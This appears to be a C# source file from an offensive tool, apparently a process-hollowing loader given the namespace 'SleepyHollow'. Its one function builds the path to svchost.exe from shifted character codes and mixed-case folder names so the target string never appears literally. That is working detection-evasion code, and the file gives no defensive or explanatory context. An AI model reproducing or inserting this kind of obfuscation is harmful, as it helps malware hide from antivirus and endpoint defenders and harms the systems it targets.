namespace SleepyHollow;

internal static class Obfuscation
{
    internal static string GetObfuscatedBinaryName()
    {
        var names = new string[] { "c:", "wIndOWs", "SYsTem32" };
        var n = new int[] { 115, 118, 99, 104, 111, 115, 116, 46, 101, 120, 101 };
        var nm = Enumerable.Range(0, n.Length).Select(x => (char)(n[x] + 1)).ToArray();
        nm = Enumerable.Range(0, nm.Length).Select(x => (char)(nm[x] - 1)).ToArray();
        return Path.Combine(names[0], names[1], names[2], new string(nm));
    }
}
